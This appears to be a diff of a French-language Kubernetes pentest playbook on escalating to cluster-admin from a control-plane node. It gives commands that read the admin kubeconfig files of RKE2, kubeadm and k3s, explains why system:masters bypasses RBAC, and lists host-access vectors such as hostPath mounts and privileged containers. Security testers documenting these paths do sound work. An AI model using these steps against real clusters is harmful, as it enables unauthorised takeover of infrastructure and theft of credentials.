@@ -100,16 +100,61 @@ ls /var/lib/rancher/rke2/agent/ 2>/dev/null && echo "WORKER"
 ps aux | grep -E "kube-apiserver|etcd|kubelet"
 ```
 
-### 6a. Si control-plane → jackpot direct
+## 6a. Si accès control-plane node → jackpot direct
+
+### Fichiers à cibler
 
 ```bash
+# RKE2
 cat /var/lib/rancher/rke2/server/cred/admin.kubeconfig
-# ou vanilla k8s
+
+# vanilla k8s (kubeadm)
 cat /etc/kubernetes/admin.conf
+
+# k3s
+cat /etc/rancher/k3s/k3s.yaml
 ```
 
-→ `export KUBECONFIG=...` = cluster-admin immédiat.
+### Exploitation
 
+```bash
+export KUBECONFIG=/var/lib/rancher/rke2/server/cred/admin.kubeconfig
+kubectl auth whoami
+# Username: system:admin (ou kubernetes-admin)
+# Groups:   [system:masters system:authenticated]
+```
+
+→ **cluster-admin immédiat**, sans passer par un vol de SA token.
+
+### Pourquoi ça marche
+
+- Ces kubeconfig contiennent un **certificat client X.509** (mTLS), pas un bearer token.
+- Le cert a `O=system:masters` en Subject → le CN devient `Username`, le O devient `Groups`.
+- `system:masters` est un **groupe hardcodé dans le code du kube-apiserver**, bindé implicitement à `cluster-admin`. Ce n'est pas un ClusterRoleBinding listable, RBAC est **bypassé entièrement** (pas juste "autorisé par une règle très permissive").
+- Contrairement à un token de SA (révocable en supprimant le Secret), un cert client compromis n'est révocable qu'en régénérant le CA du cluster ou via CRL — quasi jamais fait en pratique.
+
+### Vecteurs d'accès à documenter (c'est ça la vraie vuln, pas le fichier en soi)
+
+- Pod avec `hostPath` mount sur `/var/lib/rancher/rke2/server/cred/` ou `/etc/kubernetes/`
+- Container `privileged: true` + `nsenter` vers le namespace du host
+- DaemonSet malveillant déployé sur un node control-plane
+- Accès SSH/shell direct au node control-plane (souvent via une autre vuln : RCE, creds réutilisés, etc.)
+- kubelet API exposée sans auth permettant `exec` dans un pod avec accès hostPath
+
+### Vérif rapide des droits obtenus
+
+```bash
+kubectl auth can-i '*' '*' --all-namespaces   # → yes
+kubectl get clusterrolebindings -o wide | grep system:masters
+```
+
+### Comparaison rapide avec le vol de token SA (méthode habituelle)
+
+|              | Token SA (bearer)               | Kubeconfig admin (mTLS)             |
+| ------------ | ------------------------------- | ----------------------------------- |
+| Identité     | `system:serviceaccount:ns:name` | CN/O du cert client                 |
+| Droits       | Limités au RBAC bindé au SA     | `system:masters` = bypass total     |
+| Localisation | Secrets, pods montés            | Filesystem control-plane uniquement |
 ### 6b. Si worker → looter les tokens des autres pods du node
 
 ```bash
